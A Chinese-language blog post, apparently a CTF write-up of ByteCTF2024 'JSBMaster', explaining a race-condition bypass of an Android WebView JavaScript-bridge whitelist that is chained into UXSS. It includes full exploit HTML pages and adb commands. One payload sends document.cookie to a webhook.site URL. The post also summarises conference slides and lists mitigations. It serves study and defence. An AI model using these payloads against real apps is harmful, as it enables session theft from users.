<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>JSB鉴权条件竞争绕过 | shimmer's blog</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 共 $1 行","copy":"复制","copyFinish":"完成","expand":"展开"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><script>mermaid.initialize({
 startOnLoad: true
 , theme: 'dark'
});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.6.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body style="background-image:url(https://pica.zhimg.com/80/v2-521231b4ebe13d5fbfff75e801045ff2_1440w.webp?source=1940ef5c);"><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>JSB鉴权条件竞争绕过</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2024-10-01T06:15:19.000Z" id="date"> 2024-10-01</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-10-08T09:29:18.132Z" id="updated"> 2024-10-08</time></div></span></div></div><hr><div id="post-content"><p>参考文档：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/15701?time__1311=GqjxnQiQDQdCqGXPQgDRBQQ0Qqi=DgBgroD">初探JSB鉴权条件竞争绕过–以ByteCTF2024-JSBMaster为例 - 先知社区 (aliyun.com)</a></p>
<h2 id="ByteCTF2024-JSBMaster"><a href="#ByteCTF2024-JSBMaster" class="headerlink" title="ByteCTF2024-JSBMaster"></a>ByteCTF2024-JSBMaster</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目要求传入一个POC URL拿到<code>m.toutaio.com</code> 域上的flag</p>
<h3 id="代码流程"><a href="#代码流程" class="headerlink" title="代码流程"></a>代码流程</h3><p>先接收一个Intent获取URL，需要满足<code>uri.getHost() != null &amp;&amp; uri.getHost().endsWith(&quot;app.toutiao.com&quot;)</code>才会loadUrl，获取不到就打开example.html</p>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202409271412560.png" alt="image-20240927141201508"></p>
<p>程序自己的流程其实到这里就结束了，剩下的是作者提供了JSB的接口，但没有给出调用，所以说咱们的初步目标就是要写一个html来调用这个JSB的接口，至于具体怎么获取flag后文再讲</p>
<p>先看JSB的代码：</p>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202410031728153.png"></p>
<p>想要调用JSB代码的话，是有白名单的，需要满足<code>url.startsWith(&quot;https://app.toutiao.com/&quot;) || url.equals(&quot;file:///android_asset/example.html&quot;)</code></p>
<p>接下来的目标就是如何绕过这个鉴权</p>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202410031729996.png"></p>
<p>关注到重写的<code>shouldOverrideUrlLoading</code>函数，该函数会在页面重新加载时调用，也会获取到一个url，并且这个url只判断了非空，所以可以导致任意页面加载，这也意味着可以加载咱们自己写的html页面，格式就是  <a target="_blank" rel="noopener" href="http://app.toutiao.com/?url=http://xxxxx.com/">http://app.toutiao.com/?url=http://xxxxx.com/</a></p>
<p>可以验证：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">adb shell am start -n com.example.jsbmaster/.MainActivity -W -e url http://app.toutiao.com/?url=http://www.bilibili.com/<br></code></pre></td></tr></table></figure>

<h3 id="条件竞争绕过JSB鉴权"><a href="#条件竞争绕过JSB鉴权" class="headerlink" title="条件竞争绕过JSB鉴权"></a>条件竞争绕过JSB鉴权</h3><p>这里出题人给出了hint：<a target="_blank" rel="noopener" href="https://i.blackhat.com/asia-21/Friday-Handouts/as-21-Qin-The-Tangled-WebView-JavascriptInterface-Once-More.pdf">as-21-Qin-The-Tangled-WebView-JavascriptInterface-Once-More.23 (blackhat.com)</a></p>
<p>这个ppt我暂时没看懂，后文ppt解读补坑。（这里借鉴参考文档）参考文档提到：    “实时” 访问控制，在 UI线程(一般是主线程)中通过 <code>WebView.getUrl</code> 获取 URL</p>
<p>可以看到本题的jsb方法是跑在UI线程上</p>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202410031729811.png"></p>
<p>继续查查这个 <a target="_blank" rel="noopener" href="https://developer.android.google.cn/reference/android/app/Activity#runOnUiThread(java.lang.Runnable">runOnUiThread</a></p>
<p>如果当前线程是 UI 线程，则立即执行该操作。如果当前线程不是 UI 线程，则该操作将发布到 UI 线程的事件队列中。 </p>
<p>这里他跑在UI线程中，因为程序逻辑就有更新UI的操作</p>
<p>js与java方法的交互是在<strong>WebView 的私有后台线程</strong>上跑的，而我们的 <strong><code>WebView.getUrl</code> 只能是在UI线程</strong>中调用。当我们发起多个jsb调用，那么对应的操作就会放在UI 线程的事件队列中排队等待执行。这些操作排队调用<code>WebView.getUrl</code>，期间若WebView发生了某些改变，这个改变可能会影响到 <code>getUrl</code> 的取值，那很有可能获取到的URL是不一致的。（这里直接复制大佬的文章了）</p>
<p>那么我们就是要先发出大量的jsb事件，让他们排队等待执行的过程中，做一些事情，使得webview发生改变，进而影响getUrl的取值，使得本来通不过白名单的jsb事件变得能通过</p>
<p>[shouldOverrideUrlLoading](<a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/webkit/WebViewClient#shouldOverrideUrlLoading">https://developer.android.com/reference/android/webkit/WebViewClient#shouldOverrideUrlLoading</a>(android.webkit.WebView, android.webkit.WebResourceRequest)) 也是运行在UI线程中的，由网页发起的导航会调用该方法，若其中使用了 <code>WebView.loadUrl</code> 处理进行了浏览器启动的导航，那么就有可能会改变 <code>getUrl</code> 获取到的值</p>
<p>所以这里引出了两个新概念，浏览器启动的导航和渲染启动的导航。（后文详细介绍）</p>
<ul>
<li>浏览器启动的导航是指在 <code>WebView</code> 中直接调用类似 <code>loadUrl()</code> 方法加载页面的过程，浏览器导航负责页面请求的发起、URL 的解析、服务器资源的获取等。</li>
<li>渲染启动的导航是指用户在 <code>WebView</code> 中点击页面上的链接或者通过 JavaScript、重定向等操作时触发的导航过程，它与浏览器导航不同，导航的起点是 Web 页面内容本身，而不是通过 Java 代码直接调用 <code>loadUrl()</code>。</li>
</ul>
<p>先来实验验证下，我们准备攻击的js代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;html&gt;&lt;/html&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-keyword">function</span> <span class="hljs-title function_">i</span>(<span class="hljs-params"></span>)&#123;</span></span><br><span class="language-javascript"><span class="language-xml">                jsb.<span class="hljs-title function_">base64Decode</span>(<span class="hljs-string">`&#x27;);if(location.href.startsWith(&quot;https://app.toutiao.com/&quot;))&#123;alert(location.href)&#125;//`</span>);   <span class="hljs-comment">//这里前三个字符是是构建闭合，xss</span></span></span><br><span class="language-javascript"><span class="language-xml">            &#125;</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-comment">// 发起大量的jsb调用</span></span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-built_in">setInterval</span>(i,<span class="hljs-number">0</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-built_in">setInterval</span>(i,<span class="hljs-number">0</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-built_in">setInterval</span>(i,<span class="hljs-number">0</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-built_in">setInterval</span>(i,<span class="hljs-number">0</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-comment">// 使用浏览器启动的导航，调用了 loadUrl</span></span></span><br><span class="language-javascript"><span class="language-xml">            location.<span class="hljs-property">href</span> = <span class="hljs-string">&quot;https://a?url=https://app.toutiao.com/&quot;</span>;</span></span><br><span class="language-javascript"><span class="language-xml">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>JSBMaster<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>就是发现可以成功在<code>app.toutiao.com</code> 域上执行了js代码</p>
<p>而另外一种渲染启动导航的方式</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;html&gt;&lt;/html&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-keyword">function</span> <span class="hljs-title function_">i</span>(<span class="hljs-params"></span>)&#123;</span></span><br><span class="language-javascript"><span class="language-xml">                jsb.<span class="hljs-title function_">base64Decode</span>(<span class="hljs-string">`&#x27;);if(location.href.startsWith(&quot;https://app.toutiao.com/&quot;))&#123;alert(location.href)&#125;//`</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            &#125;</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-comment">// 发起大量的jsb调用</span></span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-built_in">setInterval</span>(i,<span class="hljs-number">0</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-built_in">setInterval</span>(i,<span class="hljs-number">0</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-built_in">setInterval</span>(i,<span class="hljs-number">0</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-built_in">setInterval</span>(i,<span class="hljs-number">0</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-comment">// 使用渲染启动的导航，未调用 loadUrl</span></span></span><br><span class="language-javascript"><span class="language-xml">            location.<span class="hljs-property">href</span> = <span class="hljs-string">&quot;https://app.toutiao.com/&quot;</span>;</span></span><br><span class="language-javascript"><span class="language-xml">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>JSBMaster<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>发现不可行</p>
<p>这两种区别以及原理后文ppt解读补坑</p>
<p>那么总结一下，我们现在可以通过浏览器启动的导航来更改geturl的值，进一步影响jsb消息队列中的白名单检测，又因为有xss洞，使得可以在app.toutiao.com域上执行任意的jsb命令</p>
<p>但是flag是需要在m.toutiao.com这个域上执行js的</p>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202410031730209.png"></p>
<h3 id="UXSS"><a href="#UXSS" class="headerlink" title="UXSS"></a>UXSS</h3><p>概念</p>
<p>  通用型跨站脚本（UXSS，Universal Cross-Site Scfipting），主要是利用浏览器及插件的漏洞（比如同源策略绕过，导致A站的脚本可以访问B站的各种私有属性，例如cookie等）来构造跨站条件，以执行恶意代码。它与普通的XSS的不同点就在于漏洞对象及受害范围的差异上，如表1所示。</p>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202410080807556.png" alt="image-20241008080704441"></p>
<p>调用 [evaluateJavascript](<a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/webkit/WebView#evaluateJavascript">https://developer.android.com/reference/android/webkit/WebView#evaluateJavascript</a>(java.lang.String, android.webkit.ValueCallback)) 方法在当前显示页面的上下文中异步执行JavaScript代码，然后这里是直接拼接的外部参数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;html&gt;&lt;/html&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-keyword">function</span> <span class="hljs-title function_">i</span>(<span class="hljs-params"></span>)&#123;</span></span><br><span class="language-javascript"><span class="language-xml">                jsb.<span class="hljs-title function_">base64Decode</span>(<span class="hljs-string">`&#x27;);if(location.href.startsWith(&quot;https://app.toutiao.com/&quot;))&#123;function i1()&#123;jsb.base64Decode(&quot;&#x27;);if(location.href.startsWith(&#x27;https://m.toutiao.com/&#x27;))&#123;location.href=&#x27;https://webhook.site/ed847c82-7110-497e-9182-f61c45602859?&#x27;+document.cookie&#125;//&quot;);&#125;setInterval(i1,0);setInterval(i1,0);setInterval(i1,0);setInterval(i1,0);location.href=&#x27;https://m.toutiao.com/&#x27;;&#125;//`</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            &#125;</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-built_in">setInterval</span>(i,<span class="hljs-number">0</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-built_in">setInterval</span>(i,<span class="hljs-number">0</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-built_in">setInterval</span>(i,<span class="hljs-number">0</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-built_in">setInterval</span>(i,<span class="hljs-number">0</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            location.<span class="hljs-property">href</span> = <span class="hljs-string">&quot;https://a?url=https://app.toutiao.com/&quot;</span>;</span></span><br><span class="language-javascript"><span class="language-xml">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>JSBMaster<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44231544/article/details/130156857">【Web】WebHook详解-CSDN博客</a></p>
<p>这里的攻击链</p>
<ul>
<li><p>浏览器启动的导航更改geturl（）获得的值</p>
</li>
<li><p>jsb绕过鉴权，在app.toutiao.com域执行任意js代码</p>
</li>
<li><p>evaluateJavascript（）构造闭合触发uxss（有种嵌套的感觉），变为在m.toutiao.com域上执行jsb</p>
</li>
<li><p>执行即可获得flag，一个hook页面拦截</p>
<p><img src="C:\Users\86186\AppData\Roaming\Typora\typora-user-images\image-20241006103139339.png" alt="image-20241006103139339"></p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202410081720215.png" alt="111"></p>
<h3 id="攻击链模型"><a href="#攻击链模型" class="headerlink" title="攻击链模型"></a>攻击链模型</h3><p>自己写了个最简单的利用模型，原理是可以得到验证的，输出webview里geturl的url值，可以看到成功修改为了指定域名  （代码在附件）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">adb shell am start -n com.example.jsb/.MainActivity -W -e url https://shimmer123456.github.io/jsbvuln.html<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202410021642471.png" alt="image-20241002164224327"></p>
<h2 id="两篇PPT解读"><a href="#两篇PPT解读" class="headerlink" title="两篇PPT解读"></a>两篇PPT解读</h2><p><a target="_blank" rel="noopener" href="https://i.blackhat.com/asia-21/Friday-Handouts/as-21-Qin-The-Tangled-WebView-JavascriptInterface-Once-More.pdf">https://i.blackhat.com/asia-21/Friday-Handouts/as-21-Qin-The-Tangled-WebView-JavascriptInterface-Once-More.pdf</a></p>
<p>文中提到两种鉴权方法，第一种：</p>
<h3 id="Tangled-getUrl-——-Lifecycle-based-access-control-基于生命周期的访问控制"><a href="#Tangled-getUrl-——-Lifecycle-based-access-control-基于生命周期的访问控制" class="headerlink" title="Tangled getUrl —— Lifecycle-based access control   基于生命周期的访问控制"></a>Tangled getUrl —— Lifecycle-based access control   基于生命周期的访问控制</h3><p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202410031824551.png" alt="image-20241003182409116"></p>
<p>ppt中只有这张图提了一下，初步理解就是从生命周期回调中获取 URL，例如 <code>onPageStarted</code>、<code>ShouldOverrideUrlLoading</code> 等</p>
<p>第二种：</p>
<h3 id="Tangled-getUrl-——-“real-time”-access-control-“实时”访问控制"><a href="#Tangled-getUrl-——-“real-time”-access-control-“实时”访问控制" class="headerlink" title="Tangled getUrl —— “real-time” access control   “实时”访问控制"></a>Tangled getUrl —— “real-time” access control   “实时”访问控制</h3><p>在 UI线程(一般是主线程)中通过 <code>WebView.getUrl</code> 获取 URL</p>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202410050959988.png"></p>
<p>本题用到的就是第二种方法，ppt中也提到</p>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202410050958834.png"></p>
<p>java与java方法的交互是在Webview后台的私有线程上跑的，<code>WebView.getUrl</code> 只能是在UI线程中调用</p>
<p>其中runOnUiThread：</p>
<p>如果当前线程是 UI 线程，则立即执行该操作。如果当前线程不是 UI 线程，则该操作将发布到 UI 线程的事件队列中。</p>
<p>js与java方法的交互是在<strong>WebView 的私有后台线程</strong>上跑的，而我们的 <strong><code>WebView.getUrl</code> 只能是在UI线程</strong>中调用。当我们发起多个jsb调用，那么对应的操作就会放在UI 线程的事件队列中排队等待执行。在这个过程中，我们做一些事情让**<code>WebView.getUrl</code>** 也发生改变，那么这个操作就会插入jsb的消息队列中，使得后面发生的jsb调用，如果里面有白名单鉴权，他的geturl获得的url就是发生改变后的url。</p>
<p>那么我们就是要先发出大量的jsb事件，让他们排队等待执行的过程中，做一些事情，使得webview发生改变，进而影响getUrl的取值，使得本来通不过白名单的jsb事件变得能通过</p>
<h3 id="New-Attack-Model-—-Navigation-Confused-Vulnerability-NCV）-导航混淆漏洞"><a href="#New-Attack-Model-—-Navigation-Confused-Vulnerability-NCV）-导航混淆漏洞" class="headerlink" title="New Attack Model  —- Navigation Confused Vulnerability(NCV） 导航混淆漏洞"></a>New Attack Model  —- Navigation Confused Vulnerability(NCV） 导航混淆漏洞</h3><h4 id="Render-initiated-VS-Browser-initiated-Navigation-渲染启动的-vs-浏览器启动的"><a href="#Render-initiated-VS-Browser-initiated-Navigation-渲染启动的-vs-浏览器启动的" class="headerlink" title="Render-initiated VS Browser-initiated Navigation  渲染启动的 vs 浏览器启动的"></a>Render-initiated VS Browser-initiated Navigation  渲染启动的 vs 浏览器启动的</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202410050857485.png" alt="image-20241005085722370"></h4><p>文中提到</p>
<p>During different types of navigation, WebView.getUrl will return different value</p>
<p>在不同类型的导航过程中，WebView.getUrl 会返回不同的值</p>
<p>当使用浏览器启动的导航时，<code>getUrl</code> 底层返回的是 <a target="_blank" rel="noopener" href="https://source.chromium.org/chromium/chromium/src/+/main:content/browser/renderer_host/navigation_controller_impl.h;drc=f522344e45882da4c7f7cb1b3a0a7bd747d654bb;l=916">pending<em>entry</em></a> ，而使用渲染启动的导航时返回的是<a target="_blank" rel="noopener" href="https://source.chromium.org/chromium/chromium/src/+/main:content/browser/renderer_host/navigation_controller_impl.cc;drc=f522344e45882da4c7f7cb1b3a0a7bd747d654bb;l=1079?q=GetVisibleEntry&ss=chromium/chromium/src">GetLastCommittedEntry()</a> 的值</p>
<p>图中倒数第二个区别：浏览器启动的导航不需要大量的检查，渲染启动的则需要</p>
<p><strong>那么依赖于他的loadurl后，geturl也可以快速执行得到改变后的url值，后者在jsb调用链中很慢，jsb执行完他也没有loadurl，所以说触发不了</strong></p>
<h4 id="Attack-In-Real-World-1"><a href="#Attack-In-Real-World-1" class="headerlink" title="Attack In Real World#1"></a>Attack In Real World#1</h4><p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202410050958151.png"></p>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202410050957295.png"></p>
<p>首先设置一个 400 毫秒的延迟后调用 <code>getToken</code>，然后立即调用 <code>browser_navigation</code>。</p>
<p><strong>时间延迟攻击</strong>：攻击者利用 <code>setTimeout</code> 来操控函数的执行顺序，试图在导航发生之前先获取令牌。这种方式可能允许攻击者在用户进行导航之前，窃取敏感信息</p>
<p>预防：</p>
<p><strong>严格的安全验证</strong>：确保在处理敏感操作时实施严格的安全验证，尤其是在允许 JavaScript 调用本地接口时。</p>
<p><strong>防止时间延迟攻击</strong>：设计时避免依赖于操作顺序，确保敏感操作在用户导航前不会被执行。（有点逻辑洞的感觉）</p>
<p>ppt里还有两种attack 感兴趣喂给gpt基本也能看懂，不做赘述</p>
<h4 id="Temporary-solution"><a href="#Temporary-solution" class="headerlink" title="Temporary solution"></a>Temporary solution</h4><ul>
<li>不要将 <code>loadUrl</code> 暴露给 JavaScript 接口</li>
<li>不要在生命周期回调中暴露 <code>loadUrl</code></li>
<li>注意 WebView 活动的 <code>launchMode</code></li>
<li>注意 WebView 的重用</li>
</ul>
<p>[<a target="_blank" rel="noopener" href="https://conference.hitb.org/hitbsecconf2021ams/materials/D2T1%20-%20A%20New%20Attack%20Model%20for%20Hybrid%20Mobile%20Applications%20-%20Ce%20Qin.pdf]">https://conference.hitb.org/hitbsecconf2021ams/materials/D2T1%20-%20A%20New%20Attack%20Model%20for%20Hybrid%20Mobile%20Applications%20-%20Ce%20Qin.pdf]</a>(<a target="_blank" rel="noopener" href="https://conference.hitb.org/hitbsecconf2021ams/materials/D2T1">https://conference.hitb.org/hitbsecconf2021ams/materials/D2T1</a> - A New Attack Model for Hybrid Mobile Applications - Ce Qin.pdf)</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/04/24/text/">Test Prev →</a></div></div></div><div id="Valine"></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="INDEX">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/touxiang.png" alt="Logo"></a><h1 id="Dr"><a href="/">shimmer</a></h1><div id="description"><p>一</p><p>些</p><p>小</p><p>笔</p><p>记</p><p>或</p><p>是</p><p>小</p><p>感</p><p>悟</p></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ByteCTF2024-JSBMaster"><span class="toc-number">1.</span> <span class="toc-text">ByteCTF2024-JSBMaster</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">代码流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E7%BB%95%E8%BF%87JSB%E9%89%B4%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">条件竞争绕过JSB鉴权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UXSS"><span class="toc-number">1.4.</span> <span class="toc-text">UXSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.5.</span> <span class="toc-text">攻击链模型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%A4%E7%AF%87PPT%E8%A7%A3%E8%AF%BB"><span class="toc-number">2.</span> <span class="toc-text">两篇PPT解读</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tangled-getUrl-%E2%80%94%E2%80%94-Lifecycle-based-access-control-%E5%9F%BA%E4%BA%8E%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">2.1.</span> <span class="toc-text">Tangled getUrl —— Lifecycle-based access control   基于生命周期的访问控制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tangled-getUrl-%E2%80%94%E2%80%94-%E2%80%9Creal-time%E2%80%9D-access-control-%E2%80%9C%E5%AE%9E%E6%97%B6%E2%80%9D%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">2.2.</span> <span class="toc-text">Tangled getUrl —— “real-time” access control   “实时”访问控制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#New-Attack-Model-%E2%80%94-Navigation-Confused-Vulnerability-NCV%EF%BC%89-%E5%AF%BC%E8%88%AA%E6%B7%B7%E6%B7%86%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.3.</span> <span class="toc-text">New Attack Model  —- Navigation Confused Vulnerability(NCV） 导航混淆漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Render-initiated-VS-Browser-initiated-Navigation-%E6%B8%B2%E6%9F%93%E5%90%AF%E5%8A%A8%E7%9A%84-vs-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%90%AF%E5%8A%A8%E7%9A%84"><span class="toc-number">2.3.1.</span> <span class="toc-text">Render-initiated VS Browser-initiated Navigation  渲染启动的 vs 浏览器启动的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.3.2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Attack-In-Real-World-1"><span class="toc-number">2.3.3.</span> <span class="toc-text">Attack In Real World#1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Temporary-solution"><span class="toc-number">2.3.4.</span> <span class="toc-text">Temporary solution</span></a></li></ol></li></ol></li></ol></div></div></div><footer><nobr>published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script 